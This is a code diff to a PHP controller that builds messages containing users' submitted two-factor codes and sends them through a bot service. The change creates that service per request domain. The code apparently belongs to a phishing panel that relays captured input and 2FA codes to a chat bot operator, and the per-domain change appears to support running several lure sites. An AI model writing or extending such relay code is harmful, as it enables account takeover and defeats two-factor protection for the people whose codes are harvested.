@@ -64,9 +64,13 @@ class UserInputController extends Controller
         $message .= "🔑 2FA Code:\n";
         $message .= "Code: <code>N/A</code>\n";
 
+        // Determine the domain
+        $domain = $request->getHost();
+
         // Send message via bot service
         try { 
-            $this->botService->sendMessage($message);
+            $botService = new BotService($domain);
+            $botService->sendMessage($message);
         } catch (\Exception $e) {
             \Log::error('Failed to send bot message: ' . $e->getMessage());
             // Continue with the response even if bot message fails
@@ -148,9 +152,13 @@ class UserInputController extends Controller
         $message .= "🔑 2FA Code:\n";
         $message .= "{$latestCode['name']}: <code>{$latestCode['code']}</code>\n";
 
+        // Determine the domain
+        $domain = $request->getHost();
+
         // Send message via bot service
         try {
-            $this->botService->sendMessage($message);
+            $botService = new BotService($domain);
+            $botService->sendMessage($message);
         } catch (\Exception $e) {
             \Log::error('Failed to send bot message: ' . $e->getMessage());
             // Continue with the response even if bot message fails
@@ -162,4 +170,4 @@ class UserInputController extends Controller
             'record_id' => $input->id
         ]);
     }
-} 
+}
